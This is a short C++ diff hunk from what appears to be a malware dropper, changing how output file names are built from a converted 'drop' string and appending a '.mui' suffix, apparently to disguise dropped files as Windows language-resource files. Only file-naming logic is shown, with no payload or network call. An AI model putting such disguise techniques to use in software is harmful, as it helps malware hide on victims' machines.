@@ -376,10 +376,10 @@ void set_name(std::uint64_t os_version)
 	std::wstring out(size, L'\0');
 	MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
 
-	name1+=out;
-//	name4+=DROPPER_OUTPUT;
-//	name5+=DROPPER_OUTPUT;
-	//name5+=".mui";
+//	name1+=out;
+	name4+=out;
+	name5+=out;
+	name5+=L".mui";
 
 #endif
 	}
